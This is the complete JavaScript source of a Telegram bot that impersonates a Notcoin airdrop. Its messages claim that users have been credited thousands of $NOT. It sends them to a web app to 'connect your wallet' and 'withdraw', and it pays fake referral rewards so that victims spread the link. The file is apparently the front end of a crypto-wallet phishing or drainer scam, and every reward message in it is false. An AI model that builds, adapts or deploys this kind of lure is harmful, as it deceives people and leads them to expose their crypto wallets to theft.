const { Telegraf } = require("telegraf");
const config = require("./config.json");
const http = require("http");

const bot = new Telegraf(config.token);

bot.start(async (ctx) => {
    try {
        const payload = ctx.message.text.substring(6);
        if (payload.length) {
            const uuid = Buffer.from(payload, "base64").toString();
            await ctx.telegram.sendMessage(
                uuid,
                `🔥 Finally! You invited ${
                    ctx.chat.first_name
                }! here is your ${(ctx.from.is_premium
                    ? 15000
                    : 3000
                ).toLocaleString()} $NOT reward`
            );
        }
        await ctx.sendPhoto(config.web_app + "/start.jpg", {
            caption: `Hi, ${ctx.chat.first_name} This is Notcoin Donation bot👋 
    
🏆 100,000,000  WAITING FOR YOU! 🏆

Go to WebApp application, connect your wallet 

Got any friends? Get them in the game. That way you'll get even more coins together.

Notcoin is what you want it to be. That's all you need to know.`,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: "CLAIM $NOT",
                            web_app: {
                                url: config.web_app,
                            },
                        },
                    ],
                    [
                        {
                            text: "Claim 5,000 $NOT 🎁",
                            callback_data: "reward",
                        },
                    ],
                    [
                        {
                            text: "Your referral link 👥",
                            callback_data: "referral",
                        },
                    ],
                    [
                        {
                            text: "More about airdrop 💬",
                            callback_data: "more",
                        },
                    ],
                ],
            },
        });
    } catch (error) {
        console.log(error);
    }
});
bot.action("reward", async (ctx) => {
    try {
        await ctx.answerCbQuery();
        await ctx.sendMessage(
            "🎉 Success! 5,000 $NOT already on your balance in the bot!",
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "📥 Withdraw to wallet!",
                                web_app: {
                                    url: config.web_app,
                                },
                            },
                        ],
                    ],
                },
            }
        );
    } catch (error) {
        console.log(error);
    }
});
bot.action("referral", async (ctx) => {
    try {
        await ctx.answerCbQuery();
        await ctx.sendMessage(`👥 Hi ${ctx.chat.first_name}, your referral link:

https://t.me/${ctx.botInfo.username}?start=${btoa(ctx.chat.id)}

Send this link to a friend to get $NOT.

For each friend, you get 3,000 $NOT.

For friends with a Telegram Premium subscription, you get 15,000 $NOT.`);
    } catch (error) {
        console.log(error);
    }
});
bot.action("more", async (ctx) => {
    try {
        await ctx.answerCbQuery();
        await ctx.sendMessage(`❤️THANK YOU: We're glad you're with us
    
It didn't take us long to figure out whether to make an AirDrop for you or not, we knew right away - you deserve it. Your support is tremendous, and this airdrop is only 5% of what we want to do later.

There will be a lot of new things to look forward to with our coin and the TON ecosystem.

🎁Participate in the Airdrop:
To participate in the Airdrop there is only one condition - you just need to hold NOT.
1. Click the “Claim $NOT” button in the welcome message.
2. Connect your wallet on which you are holding NOT.
3. Perform simple tasks and invite your friends, for which you will get extra points and eventually a chance to snatch more NOT!

🏆Distribution of rewards:
We don't have an exact date for the reward distribution yet, but we will announce the date soon!
The amount of NOTs you get will depend on your points, so don't forget to do your tasks and invite your friends.
Coins will be sent at the end of Airdrop to the wallet
our program and get involved.`);
    } catch (error) {
        console.log(error);
    }
});

const requestListener = function (req, res) {
    res.writeHead(200);
    res.end("TRUE");
};
const server = http.createServer(requestListener);

bot.launch(() => {
    try {
        server.listen(config.port, "localhost");
        console.log("Launched.");
    } catch (error) {
        console.log(error);
    }
});

process.once("SIGINT", () => {
    server.close(), bot.stop("SIGINT");
});
process.once("SIGTERM", () => {
    server.close(), bot.stop("SIGTERM");
});
